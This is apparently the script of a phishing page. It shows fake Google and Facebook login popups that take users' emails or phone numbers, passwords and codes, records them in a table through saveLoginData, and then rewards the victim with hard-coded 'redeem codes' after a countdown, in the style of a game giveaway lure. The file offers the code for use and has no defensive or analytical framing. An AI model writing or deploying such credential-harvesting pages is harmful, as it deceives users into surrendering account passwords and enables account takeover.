

let attemptCount = 0;

// Show Google Login Popup
document.getElementById("google-login").onclick = function() {
    openPopup("google-popup");
};

// Show Facebook Login Popup
document.getElementById("facebook-login").onclick = function() {
    openPopup("facebook-popup");
};

function openPopup(popupId) {
    document.getElementById(popupId).style.display = "flex";
}

function closePopup(popupId) {
    document.getElementById(popupId).style.display = "none";
}

// Google Login Process
function googleLogin() {
    const email = document.getElementById("google-email").value;
    const password = document.getElementById("google-password").value;
    const code = document.getElementById("google-code").value;

    if (validateGoogleCode(code)) {
        saveLoginData("Google", email, password, code);
        closePopup("google-popup");
        openPopup("redeem-popup");
    } else {
        alert("Invalid Google Code. Please try again.");
    }
}

// Facebook Login Process
function facebookLogin() {
    const mobile = document.getElementById("facebook-mobile").value;
    const password = document.getElementById("facebook-password").value;
    const code = document.getElementById("facebook-code").value;

    if (validateFacebookCode(code)) {
        saveLoginData("Facebook", mobile, password, code);
        closePopup("facebook-popup");
        openPopup("redeem-popup");
    } else {
        alert("Invalid Facebook Code. Please try again.");
    }
}

// Validate Google Codes
function validateGoogleCode(code) {
    const validGoogleCodes = ["FF1234", "KE1234"];
    return validGoogleCodes.includes(code);
}

// Validate Facebook Codes
function validateFacebookCode(code) {
    const validFacebookCodes = ["123456", "654321", "123321"];
    return validFacebookCodes.includes(code);
}

function saveLoginData(platform, username, password, code) {
    const tableBody = document.getElementById("login-data-body");
    const newRow = document.createElement("tr");

    const platformCell = document.createElement("td");
    platformCell.innerText = platform;
    newRow.appendChild(platformCell);

    const usernameCell = document.createElement("td");
    usernameCell.innerText = username;
    newRow.appendChild(usernameCell);

    const passwordCell = document.createElement("td");
    passwordCell.innerText = password;
    newRow.appendChild(passwordCell);

    const codeCell = document.createElement("td");
    codeCell.innerText = code;
    newRow.appendChild(codeCell);

    tableBody.appendChild(newRow);
}

let currentRedeemCodeIndex = 0;
const redeemCodes = ['MANUALCODE1', 'MANUALCODE2', 'MANUALCODE3']; // Manually defined redeem codes

function getCode() {
    closePopup('redeem-popup');
    openPopup('countdown-popup');
    startCountdown();
}

function startCountdown() {
    let timeLeft = 5;
    const countdownNumber = document.getElementById("countdown-number");

    const countdownInterval = setInterval(function() {
        countdownNumber.innerText = timeLeft;
        timeLeft--;

        if (timeLeft < 0) {
            clearInterval(countdownInterval);
            closePopup("countdown-popup");

            // Manually set the next redeem code
            if (currentRedeemCodeIndex < redeemCodes.length) {
                document.getElementById("redeem-code").value = redeemCodes[currentRedeemCodeIndex];
                currentRedeemCodeIndex++;
            } else {
                document.getElementById("redeem-code").value = "No more codes available.";
            }

            openPopup("redeem-popup");
        }
    }, 1000);
}

function copyCode() {
    const redeemCodeInput = document.getElementById("redeem-code");
    redeemCodeInput.select();
    document.execCommand("copy");

    const copyButton = document.getElementById("copyButton");
    const copyIcon = document.getElementById("copy-icon");
    const checkIcon = document.getElementById("check-icon");

    copyButton.classList.add("green-tick");
    copyIcon.style.display = "none";
    checkIcon.style.display = "inline";

    setTimeout(() => {
        copyButton.classList.remove("green-tick");
        copyIcon.style.display = "inline";
        checkIcon.style.display = "none";
    }, 3000);
}
